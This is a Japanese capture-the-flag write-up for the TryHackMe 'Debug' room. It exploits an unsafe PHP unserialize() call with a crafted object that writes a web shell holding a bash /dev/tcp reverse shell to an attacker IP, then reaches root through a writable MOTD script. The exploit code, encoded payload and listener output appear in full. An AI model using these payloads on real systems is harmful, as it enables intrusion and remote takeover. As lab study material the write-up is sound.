# Debug CTF

https://tryhackme.com/room/debug

## Enumeration

```shell
TARGET=10.10.234.231
sudo bash -c "echo $TARGET   debug.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 61
80/tcp open  http    syn-ack ttl 61
```

SSH,HTTPのみ。


### dirsearch

```sh
$ dirsearch --url http://$TARGET

[15:43:10] 200 -  572B  - /backup/                                          
[15:43:44] 200 -    2KB - /index.php                                        
[15:43:44] 200 -    2KB - /index.php/login/                                 
[15:43:46] 301 -  317B  - /javascript  ->  http://10.10.55.255/javascript/  
[15:44:07] 200 -    2KB - /readme.md 
```

index.php で、Baseフレームワークのサンプルページのようなものが表示される。

/backup/ で index.php.bak などを発見。

index.php.bak (PHP部分のみ抜粋)

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>

  <address>
    22 Test Street Melbourne, Victoria, 3000<br>
    <abbr title="Telephone">T:</abbr> <strong>1234 1234</strong> &nbsp;|&nbsp; <a href="mailto:">Send us an email!</a>
  </address>

  <hr>

</div>


<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script src="javascripts/default.js"></script>

</body>
</html>
```

index.php で名前などを入力後、適当にSubmitするとmessage.txtに保存されている。

http://debug.thm/message.txt

```
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
Message From : test || From Email : thm@thm.com || Comment : abcdefg
```

FormSubmitをシリアライズするPHP。

```php
<?php
class FormSubmit {
public $form_file = 'shell3.php';
public $message = '<?php exec("/bin/bash -c \'/bin/sh -i >& /dev/tcp/10.13.85.243/8888 0>&1\'"); ?>';
}
echo urlencode(serialize(new FormSubmit()));
?>
```

```sh
$ php ./serial.php
O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A10%3A%22shell3.php%22%3Bs%3A7%3A%22message%22%3Bs%3A78%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27%2Fbin%2Fsh+-i+%3E%26+%2Fdev%2Ftcp%2F10.13.85.243%2F8888+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

シェル取得成功。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.234.231] 34248
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

## 権限昇格１

jamesを目指す。

```sh
www-data@osboxes:/var/www/html$ ls -al /home
total 28
drwxr-xr-x  4 root  root   4096 Mar 10  2021 .
drwxr-xr-x 24 root  root   4096 Feb 28  2019 ..
drwx------ 17 james james  4096 Mar 10  2021 james
drwx------  2 root  root  16384 Feb 28  2019 lost+found
```

.htpasswdにjamesのパスワードハッシュがあった。

```sh
www-data@osboxes:/var/www/html$ cat .htpasswd
james:[REDACTED]
```

パスワードをrockyou.txt でクラックでき、SSH接続可能に。

## 権限昇格２

```sh
james@osboxes:~$ cat ./Note-To-James.txt 
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

SSHウェルカムメッセージを変更可能にしているとのこと。

```sh
james@osboxes:~$ ls -al ls -al /etc/update-motd.d
ls: cannot access 'ls': No such file or directory
/etc/update-motd.d:
total 44
drwxr-xr-x   2 root root   4096 Mar 10  2021 .
drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
-rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
-rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
```

リバースシェルコードを追加。

```sh
james@osboxes:/etc/update-motd.d$ nano 00-header
```

rootシェル取得成功。

```sh
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.234.231] 54072
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```


## 振り返り

- 最初、シリアライズ文字列をURLエンコードせずに使っていたためなかなか成功せず苦労した。
- デシリアライズ時にクラス名をもとに紐づくことをよく理解できていなかった。PHPデシリアライズの良い復習になった。
- リバースシェルコードを `/bin/bash -c ''` で囲むと成功率が高いことに今更ながら気づいた。
